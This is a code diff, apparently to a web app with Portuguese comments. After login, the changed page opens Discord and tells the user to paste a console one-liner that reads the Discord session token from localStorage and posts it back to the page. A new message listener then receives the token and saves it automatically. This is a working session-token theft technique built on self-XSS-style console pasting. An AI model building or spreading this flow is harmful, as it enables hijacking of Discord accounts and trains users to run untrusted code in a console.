@@ -288,14 +288,35 @@
             }, 3000);
         }
 
+        // Listener para receber token de outras abas via postMessage
+        window.addEventListener('message', (event) => {
+            if (event.origin !== window.location.origin) return;
+            
+            if (event.data && event.data.type === 'DISCORD_TOKEN') {
+                const token = event.data.token;
+                console.log('token recebido via postMessage');
+                
+                if (token && token.length > 10) {
+                    document.getElementById('tokenInput').value = token;
+                    showStatus('token extraido! salvando...', 'success');
+                    
+                    setTimeout(() => {
+                        saveToken();
+                    }, 500);
+                }
+            }
+        });
+
         const urlParams = new URLSearchParams(window.location.search);
         if (urlParams.get('login') === 'success') {
-            showStatus('login realizado com sucesso', 'success');
+            showStatus('login realizado! abra discord e copie o comando abaixo', 'success');
             
-            // Tenta extrair token do Discord automaticamente
+            // Abre Discord em nova aba com instruções
             setTimeout(() => {
-                extractAndSaveDiscordToken();
-            }, 1000);
+                window.open('https://discord.com/app', 'discord_token_extractor');
+                
+                showStatus('discord aberto! cola no console do discord:<br><code style="background: #222; padding: 4px; display: block; margin-top: 5px; word-break: break-all;">parent.opener.postMessage({type:"DISCORD_TOKEN",token:localStorage.getItem("token").split(\'"\')[1]},"*")</code>', 'success');
+            }, 500);
             
             window.history.replaceState({}, '', '/');
         } else if (urlParams.get('error')) {
@@ -304,9 +325,7 @@
         }
 
         function extractAndSaveDiscordToken() {
-            // A extração automática não é possível por razões de segurança
-            // Discord não expõe o token via localStorage para JS
-            showStatus('cole seu token manualmente no campo. instruções acima!', 'error');
+            // Função descontinuada - token agora vem via postMessage
         }
 
         document.getElementById('tokenInput').addEventListener('keypress', function(e) {
